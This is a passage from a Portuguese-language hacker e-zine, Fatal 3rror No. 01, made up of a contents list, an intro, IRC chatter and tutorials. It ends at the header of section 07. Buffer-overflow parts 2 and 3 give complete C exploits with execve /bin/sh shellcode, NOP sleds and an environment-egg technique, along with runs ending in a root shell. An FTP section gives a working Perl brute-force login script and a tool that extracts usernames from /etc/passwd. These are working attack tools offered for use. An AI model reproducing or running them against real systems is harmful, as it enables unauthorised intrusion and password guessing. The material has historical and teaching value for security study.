              ____________________ ________________
             |                   //                |_
            /    FFFFFFFFFFF    //    33333333333   /
           /_   FFFFFFFFFFF    //    33333333333   /
             |   FFFFF         \\          33333   |
             |   FFFFF          \\         33333   |_
            /    FFFFFFFFFFF    //    33333333333   /
           /_   FFFFFFFFFFF    //    33333333333   /
             |   FFFFF     ___//           33333   |
             |   FFFFF    //~~~            33333   |___
             |   FFFF    //    33333333333333333333   /
             |   FFF    //    33333333333333333333   /
             |   FF    //    33333333333333333333   /
             |   F    //    33333333333333333333   /
             |_______//___________________________/

                       .o.  FATAL 3RROR
                       .o.  No. 01
                       .o.  01/06/2000
                       .o.  By Cheat Struck
                       .o.  cszine@xoommail.com
 



 





        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~        00 - T0PiCZ         ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Cheat  Struck       _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~


 .od[ 00 ]bo.    T0PiCZ                      / Cheat Struck
 .od[ 01 ]bo.    INTR0DUCTi0N                / Cheat Struck
 .od[ 02 ]bo.    TiPZ                        / Cheat Struck
 .od[ 03 ]bo.    Comentarios                 / Cheat Struck
 .od[ 04 ]bo.    Buffer Overflows parte 2    / Cheat Struck
 .od[ 05 ]bo.    Buffer Overflows parte 3    / Cheat Struck
 .od[ 06 ]bo.    FTP Brute Force             / Cheat Struck
 .od[ 07 ]bo.    Certo dia quando a TDK acabou...
                                             / Cheat Struck
 .od[ 08 ]bo.    DDoS                        / s0laris
 .od[ 09 ]bo.    Fucando com Logs            / Cheat Struck
 .od[ 10 ]bo.    device\device bug           / MaskMaster
 .od[ 11 ]bo.    Codeando kernels para Henix / Cheat Struck
 .od[ 12 ]bo.    Inetd Backdoors             / Cheat Struck
 .od[ 13 ]bo.    Email Bug                   / Cacaio
 .od[ 14 ]bo.    Brincando com o LOOPBACK    / Cheat Struck
 .od[ 15 ]bo.    Problemas com o LILO        / Cheat Struck
 .od[ 16 ]bo.    Truques com Terminais       / Cheat Struck
 .od[ 17 ]bo.    RDS Hacking                 / MaskMaster
 .od[ 18 ]bo.    WinNT Folder bug            / Cliptor
 .od[ 19 ]bo.    Hackeando daemon de ftp     / Slash-DOMI
 .od[ 20 ]bo.    Convertedor ASCII-HEXA      / Cheat Struck
 .od[ 21 ]bo.    Emails                      / Cheat Struck
 .od[ 22 ]bo.    Th3 End                     / Cheat Struck
















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~     01 - INTR0DUCTi0N     ~YXXXXx_
  _xXXXXXX(                               )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_       Cheat  Struck       _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~


   Pow!!! Q sux ter que escrever essa merda de introducao enquanto eu
poderia tar... sei lah, durmindo (pra variar um poko)....
   Mas vamo fala merda pra ninguem ler....
   A zine ta mto boa, nessa edicao uns loko fikaram com pena di mim e
decidiram ajudar, entao achu q o nivel da zine subiu. Fora issu, aki em
casa minha mae ta me enchendo o sako q nao saiu da frente do laptop
(aham!!! Suei mas consegui comprar) e no colegio to me fudendo agora no
3ao e o pior q no final do ano tem vestiba. Porra!
   hm... issu aki ainda ta pequeno... uke + eu posso dizer??? Ah! Nao
recebi muitos emails entao quero pedi pra ti q ta lendo issu, tirar a
mao do sako e escreve pra mim saber c tao lendo tudo issu. 
   C voce tinha escrito, escreva denovo soh que para meu novo emaiu ja
que o redirecionador da struck.8m.com ta com pau.

   Newmail: cszine@xoommail.com

   Issu ae... vou parar de fala merda e pucha um ronco.
   Ah!!! Abrindo um PS aki...
   Tem muita gente confundido a F3 com a fatal error da hackernews. Po!
Tem nada a ver viu. Issu eh uma zine e akilu uma satira (mto bem feita)
com os heckers q a midia idolatra. Alem do mais issu aki c escreve com
3 e nao com e.

   Aviso! A f3 nao eh um grupo, somente uma ezine escrita por pessoas de
diversos grupos ou que agem por conta propria (no meu caso). Os grupos
podem ser rivais mas nenhum tera preferencia aki. C a sua materia for boa
ela sera publicada, c for podre nao. Porem todas as materias enviadas p/
serem publicadas devem ser exclusivas da f3 pelo menos ateh o lancamento
dela, mesmo pq eu nao tenho como controlar o que voce fara' com ela 
depois, mas caso ela ja tenha sido publicada previamente nao sera colocada
aqui. Tankz for ur attention.















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~         02 - TiPZ         ~YXXXXx_
  _xXXXXXX(                               )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_       Cheat  Struck       _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~



- Como baixar a f3 no windows ou X???
  Direciona teu browser para http://members.xoom.com/cszine/f3-XX.tgz
  Ou visite http://struck.8m.com/f3 e clice no link.

- Como baixar a f3 no linux console???
  Digite no prompt:
    wget http://members.xoom.com/cszine/f3-XX.tgz
  No lugar de XX ponha a edicao da f3.

- Como descompactar a f3-XX.tgz no linux???
    tar -zxvf f3-XX.tgz

- Como descompactar a f3-XX.zip no windows???
  Rode o winzip. duh! 

- Como extrair os programas de dentro da f3???
    gcc extract.c -o extract
    ./extract f3-XX.txt















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~      03 - Comentarios     ~YXXXXx_
  _xXXXXXX(                               )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_       Cheat  Struck       _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~




  Antes do lancamento da edicao 00 da F3, eu decidi espalhar para uma
galerinha ae, e ver os comentarios, opnioes, etc... Vou coloca-las aki
como prova de minha atencao a todas... =)

[in PVT]
<TPGA> ficou muito boa, parabéns
<struck> tkz...


[in other PVT]
<Cacaio> cara o file abriu todo errado
<struck> ??
<struck> tipus... c eh o 1o a reclamar ateh agora
<struck> um monti di gente ja baixou e conseguiu ler legal...
<struck> tenta dinovo ae...
<Cacaio> tentei merma coisa
<Cacaio> =:/
<struck> putz...
<struck> mas deu probl qdo???
<struck> pra destgzia???
<struck> ou pra baixar?
<Cacaio> tirar tgz
<Cacaio> coloca a versao .txt la
<struck> ok

--------------
   Tipo...
   Pra destageziar no linux basta dar tar -zxvf f3-XX.tgz.
   No windows use winzip no .tgz vai abri o f3-XX, renomeie pra f3.tar
e rode o winzip dinovo. Win sux...
   Pra quem achou complicado vo colocar a versao text na page.



<struck> vai dizendo o q ta achandu...
<Cacaio> ficou legalzinha
<Cacaio> ja li toda
<struck> poxa
<struck> c le rapido
<Cacaio> q nada
<Cacaio> normal hehe
<struck> heheh
<struck> q achou... vai falando
<Cacaio> po ja falei hehe
<Cacaio> ta legalzinha
<Cacaio> curti a calculadora de vezes



[in #secure - Brasnerd]
<f0rwh4t> to até com medo de ler essa zine
<f0rwh4t> hackers me dão alergia
<struck> nerds tem alergia
<struck> =)


[in #secure - Brasnerd]
<d3m3ns> struck: tipo.. olhando assim de primeira
<d3m3ns> tem coisa mais avancada q os outros zines
<d3m3ns> de buffer... prog's seus (nsb)
<d3m3ns> e tem umas dicas massas...
<d3m3ns> do kernel, calculadora... talz
<d3m3ns> depois vou ler com calma
<struck> calculadora de vezes
<struck> hauhauhauhau
<struck> essa eh a mais l33t q tem
<d3m3ns> sei lah o q eh isso..haah
<struck> olha lah...
<d3m3ns> peri q vou ver o q eh.. hee
<struck> um dos prg mais litu q eu fiz
<d3m3ns> ahahahah
<d3m3ns> pq vc colocou isso ali?
<d3m3ns> q lixo
<struck> soh pra mostra pro thasmx como eu faco os prg mais litu q ele...
<struck> heheh
<struck> comedia
<d3m3ns> aii
<d3m3ns> essa calc ficou l1t4
<struck> eu sei
<struck> por issu botei lah
<struck> eh tipu um bonus...
<struck> hauhauha
<d3m3ns> #define VERSION 0.000001
<d3m3ns> ahahaha
<d3m3ns> q coisa lita... 
<d3m3ns> nunca vi isso.. definir a versao dela 
<struck> =)



[in #poweroff - Brasnerd]
<phrog> h4xz0r
<phrog> diz onde tem akel eteu zine novo ae
<phrog> ontem meu hd parou antes deu pegar =)
<phrog> ahah tava foda
<sk> www.deathknights.com
<struck> nah
<struck> members.xoom.com/cszine/f3-00.tgz
<sk> bah... coders zine?
<phrog> nao
<phrog> eh o f3 zine
<struck> Fatal_3rror
<phrog> tipo
<phrog> ekale materia do xterm ta lama d+ =)
<sk> q feio... copiar o extract do phrack... :/
<phrog> akela
<phrog> de geral ta legalzim =)
<sk> uhuhuhuhuhuhuuhuhuhuh
<sk> o #r00t vai ficar foda agora!!!!
<phrog> haha pq?
<sk> Com o sucesso da Bl0w o knal #r00t (ja sem mais private) comecou a encher
<struck> =)
<struck> tava jogandu um jogo paia aki
<struck> tipus...
<struck> extract.c --- pelo menos manti os creditos.. nao so como alguns ae...
<sk> Entao um novo knal foi criado para os mano mais antigo. Dessa veiz ateh mesmo com senha. Q l33to!!
<struck> eu usei pq acho legalzin...
<sk> eu sei... eu vi... soh to zoando... :P
<sk> valeu a parte q toca a qse todos...
<struck> sk... teve um monte de gente q chorou ao ler essa minha auto-biografia.. =)
<phrog> hahahahha
<phrog> biografia sux
<phrog> senaum vou ter q declarar q sou o mitnick
<struck> hehehe
<struck> mas a minha eh mais hax0r q a do mitnick
<sk> ehehehhhehehehe
<sk> faltou greetz pra galera... fiquei ofendido... :P
<phrog> eh
<phrog> eu tb
<sk> vou ateh ver o r00t
<struck> =P
<phrog> r00t
<struck> eu coloco na 01
<phrog> ta fechado pra balanco
<phrog> e tipo
<sk> eheheheh eu vi
<phrog> vc naum falow do canal + private do mundo
<phrog> p #lkz
<phrog> o #lkz
<phrog> ph34r 4 l0t!@#@!#!@#
<sk> ahhauahuahuahauhauhauhauhauahuahuahauhauhau
<sk> #lkz owna tudo!!!
<phrog> yepz
<sk> eh muito pvt... mais $500,00 se ganha registro
<sk> por $2.000,00 op
<phrog> heuauehu
<struck> nao falei pra nao enche di lamah lah tbm...
<phrog> tipo
<sk> num vai enche naum...
<phrog> nem vai encher
<sk> mais fica foda q comeca os join e ban
<phrog> a key ainda naum foi qbrada pelo pentagono
<sk> fica um spam...
<struck> heheeh
<phrog> pra entrar lah agora soh por autenticacao de retina
<sk> a key eh o maior numero perfeito encontrado pelo homem...
<struck> e ia te mto muleke pidindo pro6 da acesso pra eles lah...
<sk> ehehehehhe
<phrog> tipo a gente naum liga
<phrog> pode falar heheh
<sk> ./ignore *!*@* all
<phrog> gostamos de fans =)
<struck> hehehe
<sk> ahauhauahuahua
<sk> nem...
<phrog> aeuehuahuhuaehue
<sk> nego pagando pau eh suca
<phrog> o sk naum gosta
<phrog> ele eh timido
<sk> struck, se tah com problemas na suas libs...
<phrog> #lkz rola 0-days
<phrog> tipo...
<phrog> wu-ftpd conversions exploit - phrog'00 - power off
<phrog> =)
<sk> naum... eu sou muito assediado pelos minhas fans
<sk> se tiver cueca enchendo num rola... :P
<struck> heheheh
<struck> <sk> struck, se tah com problemas na suas libs...
<struck> ????
<sk> struck, ctrl+c ctrl+v do txt do aleph1 num vale... :P
<sk> struck, se tah linkando com duas libs...
<phrog> uaeuhuhuae
<phrog> tipo
<struck> =P
<struck> nah....
<phrog> copiar coisas dos leets tem efeitos colaterais
<sk> shellcode do aleph1?
<phrog> vide SDI skure uground .org
<struck> nao eh copia...
<struck> ta.. o shellcode sim...
<sk> ateh os disassemble...
<struck> mas o txt eu usei minhas palavras e meus metodos de programacao e tal...

-----
   Ta ja falaram uke tinham pra falar...





[in one PVT]
<struck`> iae fio...
<struck`> q nota c da pra zine?
<Slash-DOMI> eu num li toda
<Slash-DOMI> mas so pelo extract 10
<Slash-DOMI> :)
<Slash-DOMI> gostei muito disso
<struck`> hehehe
<struck`> eu tbm...
<Slash-DOMI> a zine ta otima, se eu puder ajudar em algo
<struck`> mas o extract nao eh de minha autoria...
<struck`> peguei na phrack
<struck`> claru...
<Slash-DOMI> ta, mas fico otimo na zine




   Issu eh tudo! Chega de encher linguissa.















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~   04 - Buffer Overflows   ~YXXXXx_
  _xXXXXXX(            parte 2            )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_       Cheat  Struck       _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~



   Bem... issu nao estava programado e nao era esperado, mas devido a
varios elogios feitos ao texto sobre overflows q saiu na f3-00 decidi
fazer uma continuacao soh para aprofundar mais nessa t3kn33k.
   Dessa vez vamos falar mais serio pois vc ja tem ideia de como funciona
o buffer overwrite e como +/- codear um.

   Na aula passada o que faziamos era mudar o source do programa
vulneravel para que nos desse exatamente o RET_ADDR de seu buffer
vulneravel. Dessa vez vamos ver c conseguimos fazer o exploit funfar, sem
precisar alterar o programa.

   Como voce ja deve ter percebido, seria loucura tentar adivinhar
exatamente o ADDR do inicio do buffer do prog (onde esta o shellcode) e ir
ele mudando no xploit. Nos levariamos um seculo ateh encontrarmos
exatamente o ADDR.
   O que faremos entao eh colocarmos NOP'z (0x90) no inicio do buffer,
antes do shellcode, para que assim possamos direcionar o RET_ADDR para
um numero maior de address'z.
   Vamos ver um exemplo:

<++> buff2/ex.c

#define LEN 100

char sc[] =
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41";

unsigned long get_esp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  int i, offset=0, bsize=LEN+32;  
  char large_string[bsize];
  long *long_ptr = (long *) large_string;
  long addr;

  addr = get_esp() - offset;

//Coloca o RET_ADDR
  for (i = 0; i < bsize; i+=4)
    *(long_ptr ++) = addr;

//Coloca os NOPs
  for (i = 0; i < (bsize/2) - strlen(sc); i++)
    *(large_string+i) = 0x42;

//Coloca o Shellcode
  memcpy(large_string+i,sc,strlen(sc));

  puts(large_string);
}

<-->

  Aki eh soh um exemplo de como o exploit sera escrito. Compile-o e rode
para ver como ficara' o buffer.

# gcc ex.c -oex
# ./ex
BBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA¿Àüÿ¿Àüÿ
¿Àüÿ¿Àüÿ¿Àüÿ¿Àüÿ¿Àüÿ¿Àüÿ¿Àüÿ¿Àüÿ¿Àüÿ¿Àüÿ¿Àüÿ¿Àüÿ¿Àüÿ¿Àüÿ¿Àüÿ¿Àüÿ¿È£

  Veja que o buffer eh dividido em 2 partes:
  O shellcode, incluindo os NOPs;
  E o RET_ADDR repetido varias vezes.
  No exemplo acima a lengenda eh:

BBBB = NOPs
AAAA = Shellcode
¿Àüÿ = RET_ADDR

  Mas mesmo assim sera muito dificio acertar um dos addrs assim no chute.
Por issu que usamos o get_sp() junto a um offset para que fiquemos mais
proximos do addr do buffer.

  Agora vamos colocar o tradicional programa vulneravel...

<++> buff2/vul.c

void main(int argc, char *argv[]) {
  char buffer[100];

  if (argc > 1)
    strcpy(buffer,argv[1]);
}

<-->

  E entao o exploit do mesmo...

<++> buff2/xplt.c

#define PROG "./vul"
#define LEN 100

char sc[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_esp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  int i, offset=0, bsize=LEN+32;  
  char large_string[bsize];
  long *long_ptr = (long *) large_string;
  long addr;

  if (argc > 1) offset  = atoi(argv[1]);

  addr = get_esp() - offset;
  printf("0x%x\n", addr);

  for (i = 0; i < bsize; i+=4)
    *(long_ptr ++) = addr;

  for (i = 0; i < (bsize/2) - strlen(sc); i++)
    large_string[i] = 0x90;

  memcpy(large_string+i,sc,strlen(sc));

  execl(PROG, PROG, large_string, 0);
}

<-->

  Agora vamos tentar faze-lo funcionar...

# ./xplt
0xbffffcc4
Segmentation fault (core dumped)
# ./xplt 10
0xbffffcba
Segmentation fault (core dumped)
# ./a.out 20
0xbffffcb0
bash# 

  Viu q maneiro... o brinquedo funciona. O saco eh que temos q ficar
testando offsets diferentes. Mas depois de descobrirmos o offset correto
fica facil de c usar.

  Com issu concluimos nossa 2a aula sobre buffer overflows...















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~   05 - Buffer Overflows   ~YXXXXx_
  _xXXXXXX(            parte 3            )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_       Cheat  Struck       _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~



  Essa eh a ultima parte deste tutorial, pois ja to cansado de escever
sobre essa porra de t3kn33k.
  Bem... vejamos.... Nos ja aprendemos quase tudo sobre issu. O que deve
estar faltando???

  Acontece que para exploitarmos um buffer pequeno, nao podemos colocar
tudo dentro dele (NOPs, ShellCode e RET_ADDR). C tentassemos fazer issu o
que aconteceria????

1. Poderia ocorrer um buffer overflow no seu proprio exploit.
2. O RET_ADDR cairia nos NOPs apontando para 0x90909090, ou no shellcode.

  Vamos ver c eh verdade???
  Primeiro o programa vulneravel com um buffer pequeno.

<++> buff3/vul.c
void main(int argc, char *argv[]) {
  char buffer[50];

  if (argc > 1)
    strcpy(buffer,argv[1]);
}
<-->

  Okay... eh um buffer de 50bytes... vamos tentar exploita-lo com o xploit
da aula passada...

<++> buff3/xplt1.c
#define PROG "./vul"
#define LEN 50

char sc[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_esp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  int i, offset=0, bsize=LEN+32;  
  char large_string[bsize];
  long *long_ptr = (long *) large_string;
  long addr;

  if (argc > 1) offset  = atoi(argv[1]);

  addr = get_esp() - offset;
  printf("0x%x\n", addr);

  for (i = 0; i < bsize; i+=4)
    *(long_ptr ++) = addr;

  for (i = 0; i < (bsize/2) - strlen(sc); i++)
    large_string[i] = 0x90;

  memcpy(large_string+i,sc,strlen(sc));

  execl(PROG, PROG, large_string, 0);
}

<-->

  Note que mudamos o LEN de acordo com o tamanho do buffer vulneravel.
  Vamos experimentar usa-lo...


# ./xplt1
0xbffffcf4
Segmentation fault (core dumped)


  Viu??? Esse Segmentation fault ocorreu no proprio exploit e nao no
programa vulneravel. Issu por que o exploit nao conseguiu colocar
NOPs+shellcode+RET_ADDR num buffer com tamanho 82. Note q 32 bytes ainda
sao somados ao LEN.

  Entao va no xplt1.c e mude o LEN para algo maior como 200. Entao rode
novamente...


# ./xplt1
0xbffffc60
Segmentation fault (core dumped)
# gdb vul core
GNU gdb 4.17.0.4 with Linux/x86 hardware watchpoint and FPU support
Copyright 1998 Free Software Foundation, Inc.
(blablablabla...)
Program terminated with signal 11, Segmentation fault.
Reading symbols from /lib/libc.so.6...done.
Reading symbols from /lib/ld-linux.so.2...done.
#0  0x90909090 in ?? ()
(gdb) info reg
     eax: 0xbffffc6c -1073742740
     ecx: 0xfffffee3        -285
     edx: 0xbffffe73 -1073742221
     ebx: 0x4000a3c8  1073783752
     esp: 0xbffffca8 -1073742680
     ebp: 0x90909090 -1869574000
     esi:        0x2           2
     edi:  0x804842c   134513708
     eip: 0x90909090 -1869574000
  eflags:    0x10286 IOPL: 0; flags: PF SF IF RF
orig_eax: 0xffffffff          -1
      cs:       0x23          35
      ss:       0x2b          43
      ds:       0x2b          43
      es:       0x2b          43
      fs:       0x2b          43
      gs:       0x2b          43
(gdb) q
# 


  Viu?? Agora ocorreu Segmentation Fault no vul. Porque???
  Bem... Acontece que nossa sequencia NOP+SC+ADDR ficou um pouco
maior do que o buffer vulneravel, e ao invez do ADDR entrar no return
address, quem ficou lah foi o NOP.
  Hm??
  Repare...

     eip: 0x90909090 -1869574000

  Viu soh?
  0x90 = NOP (Soh lembrando...)

  Entao como vamos fazer???
  Vamos dividir nosso buffer em 2 partes:
  A primeira com o RET_ADDR;
  A segunda com os NOPs+Shellcode.

  Entao colocamos eles em variaveis diferentes e executamos o prog vul com
a variavel onde esta o RET_ADDR. Este entao vai apontar para a segunda
variavel, onde estam NOPs+ShellCode.
  Vamos ao exploit:

<++> buff3/xplt2.c

#include <stdlib.h>

#define PROG "./vul"
#define LEN 300

char sc[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh\x00\x45\x75\x20\x73\x65\x69\x20"
"\x71\x20\x65\x73\x73\x65\x20\x73\x63\x20\x65\x68\x20\x63\x6f\x70"
"\x69\x61\x20\x64\x6f\x20\x41\x6c\x65\x70\x68\x31\x2e\x20\x4d\x61"
"\x73\x20\x71\x20\x63\x20\x64\x61\x6e\x65\x21\x21\x21\x21";

unsigned long get_esp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  int offset=0, bsize=LEN;  
  int i, eggsize=2048;
  char large_string[bsize], *egg;
  long *addr_ptr = (long *) large_string;
  long addr;
  char command[255];

  if (argc > 1) offset  = atoi(argv[1]);

  if (!(egg = malloc(eggsize))) {
    printf("Error : EGGSIZE muito grande.\n");
    exit(0);
  }

  addr = get_esp() - offset;
  printf("0x%x\n", addr);

  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  for (i = 0; i < eggsize - strlen(sc) -1; i++)
    egg[i] = 0x90;

  memcpy(egg+i,sc,strlen(sc));


  memcpy(egg,"EGG=",4);
  putenv(egg);
  memcpy(large_string,"RET=",4);
  putenv(large_string);
  sprintf(command,"%s $RET",PROG);
  system(command);
}
<-->

  Note que nao importa o tamanho do LEN pois nele estara apenas o ADDR
e nao tem perigo do RET_ADDR cair num NOP.
  Vamos testa-lo???

# ./xplt2
0xbffffb1c
bash#

  Rlz!!! O xploit fonunga!!!!
  Se nao funfar de primeira, tente usar offsets pequenos como 1, pois
as vezes o compilador confunde os caracteres usados para o RET_ADDR. Por
exemplo, se o RET_ADDR for 0xbffffc00 ao ser colocado num buffer, o 00
iria marcar o fim do buffer. Resultado: nada seria gravado.
  E com issu concluimos a nossa ultima aula de buffer overflows.

  Detalhe... Os 3 textos que escrevi sobre este assunto nao foram copias
nem traducoes de outros. Pode haver alguma semelhanca em outros textos
(bibliografia na parte 1) pois me basiei neles e aprendi com eles. Mas eu
tentei usar minhas palavras para fazer esta trilogia e meus metodos de
programacao para fazer os exploits.
  A unica coisa rippada aki foi o shellcode do aleph1, mas e dai!!
  Porra! Deu uma trabalheira pra fazer issu e tentei deixar bem claro o
que eh, como funfa, como fazer, etc... entao c voce nao gostou foda-se!
  Issu ae... Agora chega neh??? Vamo fala de outra coisa po!
















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~    06 - FTP Brute Force   ~YXXXXx_
  _xXXXXXX(                               )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_       Cheat  Struck       _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~



   Esse programa um update do FTP Brute Force attack 1.0 da Near(Z).
Eu dei uma melhorada nele, para ficar mais rapido e mais tchananam...
   No da nearz ele abria uma conexao para cada teste de login/pass.
Agora ele testa 5 l/p em cada conexao oque torna o programa mais rapido.
Mas porque entao soh 5? Pq a maioria dos daemons ftp sao configurados
para desconectar o cliente apos o 5o erro de login.
   No antigo voce entrava com uma wordlist e 1 unico login era testado.
Agora voce indica tambem um loginlist para poder testar as words em 
varios logins.
   Como usa??



[struck@henix]$ ./bruteftp.pl 127.0.0.1 logins dict
FTP Brute force
by Cheat Struck, struck.8m.com

root - [1] not found - root
root - [1] not found - struck
root - [1] not found - lamah
root - [1] not found - cheat
struck - [1] not found - root
struck - [1] not found - struck
struck - [1] not found - lamah

struck - [8] !!!ENTROU!!! - cheat

[struck@henix]$



   Viu??? Facil e pratico...
   Soh tipo... nao poe na login_list ftp ou anonymous pq qquer merda
vai entrar como senha. Nao seja burro! Pra ficar mais facil, faiz ela
baseada no /etc/passwd do host. Soh pa poupar seu tempo vai junto o 
retire.c que tira o login do passwd pra vc.



[struck@henix]$ gcc retire.c -o retire
[struck@henix]$ ./retire /etc/passwd logins
Retirando logins...
Logins gravados em logins

[struck@henix]$



   Ja a wordlist, de preferencia uma pequena com senhas comuns.
   Ae estao os programas:

<++> bruteftp/retire.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

main(int argc, char *argv[]) {

 FILE *fp, *fp2;
 char login[1000], com[50];
 int i=0;

 if (argc < 3) { 
	printf("Use %s <passwd> <login_list>\n",argv[0]);
	exit(0);
 }
 printf("Retirando logins...\n");

 fp = fopen(argv[1],"r");
 fp2 = fopen(argv[2],"w");

 while( !feof(fp) ) {

  bzero((char *)&login, sizeof(login));  
  bzero((char *)&com, sizeof(com));  

  if(fgets(login, 1000, fp) == NULL) break;
  login[strlen(login)-1] = ' ';

  for(i=0;i<1000;i++){

	if(login[i] == ':') break;
	com[i] = login[i];
	
  }
  fprintf(fp2,"%s\n",com);
 
 }

 fclose(fp);
 fclose(fp2);
 printf("Logins gravados em %s\n\n",argv[2]);

}
<-->

<++> bruteftp/bruteftp.pl
#!/usr/bin/perl
use Socket;
print "\nFTP Brute force";
print "\nby Cheat Struck, struck.8m.com\n";
if ($ARGV[0] eq '' || $ARGV[1] eq '' || $ARGV[2] eq '') {
   print "\n\nUsage: bruteftp.pl Host Login_list Word_list";
   print "\nEx. hackftp 127.0.0.1 logins Dict\n\n";
   exit;
   }


$i=0;
$temp='';
$login='';
$temp2='';

$h = "$ARGV[0]";
$p = 21;
$in_addr = (gethostbyname($h));
$addr = sockaddr_in($p,$in_addr);
$proto = getprotobyname('tcp');


open (FILE2,"$ARGV[1]") || die "cade o lista logins?";

do{ 
	$x=1;$n=0;
	&getlogin;
	&connection;
	&data1;
	do{
		&getword;
		&data2;
		&result;
	}while($x==1);
	close S;

}while(1==1);

sub getlogin
{
        $login=''; $l=''; $var12='';
        open (FILE,"$ARGV[2]") || die "cade o dicionario?";
        do{
                $login="$login$var12";
                read(FILE2, $var12, 1);
        }while($var12 ne chr(10));
	$l=$login;
        $login="$login$var12";

}
sub getword
{
        $temp2='';
        do{
                read(FILE, $var12, 1);
                $temp2="$temp2$var12";
        }while($var12 ne chr(10));
	$z++; $n++;
	if($n == 5) { 
		close S;
		&connection;
	        &data1;
	}
	if(eof(FILE)) { $x=0; };
}

sub connection
{
        socket(S, AF_INET, SOCK_STREAM, $proto) || die $!;
        connect(S,$addr) || die $!;
}

sub data1
{
        do{
                read(S, $var1, 1) || die $!;
                $temp="$temp$var1"; $i++;
        }while(substr($temp,$i-3,3) ne '220');

}
sub data2
{
	$temp='';
	$i=0;	
	send (S,"user $login\n",0) || die "Erro enviando";
        do{
                read(S, $var1, 1) || die $!;
                $temp="$temp$var1"; $i++;
        }while(substr($temp,$i-3,3) ne '331' && substr($temp,$i-3,3) ne '530');
	if(substr($temp,$i-3,3) eq '530'){
		print "\nLogin nao permitido - $ARGV[1]\n\n";
		exit;
	}
		send (S,"pass $temp2",0) || die "Erro enviando";
	$temp='';
	$i=0;
        do{
                read(S, $var1, 1) || die $!;
                $temp="$temp$var1"; $i++;
        }while(substr($temp,$i-3,3) ne '530' && substr($temp,$i-3,3) ne '230');
}
sub result
{
        if(substr($temp,$i-3,3) eq '230'){
            	print "\n$l - [$z] !!!ENTROU!!! - $temp2\n";
          	exit;
	}
        if(substr($temp,$i-3,3) eq '530'){
	        print "$l - [$z] not found - $temp2";
	}	
}

<-->















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~  07 - Certo dia quando    ~YXXXXx_
  _xXXXXXX(        a TDK acabou...        )XXXXXXx_
